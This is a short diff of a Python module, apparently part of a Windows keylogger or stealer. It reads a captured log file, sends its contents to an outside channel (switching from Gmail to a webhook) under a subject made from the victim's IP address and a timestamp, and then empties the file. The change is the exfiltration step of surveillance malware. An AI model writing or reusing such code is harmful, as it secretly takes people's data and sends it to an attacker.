@@ -69,10 +69,12 @@ class win32_func():
             subject=str(f"{IPAddr} = {current_time}")
             with open(f'{install_path}\\{filename}', 'r') as f:
                 data = f.read()
+            # ?/Send Log/? #
+            #exec_send.Send.Gmail(email, subject, data)
+            exec_send.Send.Webhook(subject, install_path, filename)
+            # ?/Send/? #
             with open(f'{install_path}\\{filename}', 'w') as f:
                 f.write("")
-            exec_send.Send.Gmail(email, subject, data)
-            time.sleep(15)
 
 
 
